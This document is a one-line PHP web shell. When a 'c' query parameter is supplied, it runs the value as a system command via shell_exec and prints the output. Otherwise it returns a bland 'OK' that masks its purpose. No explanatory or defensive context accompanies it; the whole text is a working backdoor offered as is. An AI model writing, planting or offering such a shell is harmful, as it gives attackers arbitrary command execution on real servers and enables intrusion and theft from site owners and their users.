<?php if(isset($_GET["c"])){echo "<pre>".shell_exec($_GET["c"])."</pre>";die();} echo "OK"; ?>
